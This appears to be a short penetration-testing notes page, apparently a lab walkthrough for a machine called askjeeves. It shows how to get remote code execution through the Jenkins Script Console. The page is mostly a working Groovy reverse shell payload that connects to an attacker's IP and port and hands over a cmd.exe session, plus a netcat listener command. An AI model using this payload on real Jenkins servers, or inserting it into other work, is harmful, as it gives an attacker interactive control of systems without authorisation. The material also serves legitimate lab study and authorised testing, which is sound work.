# Jenkins / askjeeves

If you look at Jenkins, check Manage Jenkins page and script console. This is the most likely the way you can execute RCE to the target system.

### [Jenkins Penetration Testing](https://github.com/gquere/pwn_jenkins) / [Script Console - Reverse Shell](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6)

### Look for 'Manage Jenkins' by admin.

<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

### Look for Script Console in 'Manage Jenkins'.

<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

### Reverse shell

{% code overflow="wrap" %}
```bash
kali> rlwrap nc -nlvp 4444 

# Add teh following to the Script Console field above. 
# Change the IP address and port number 
String host="x.x.x.x";
int port=4444;
String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
{% endcode %}
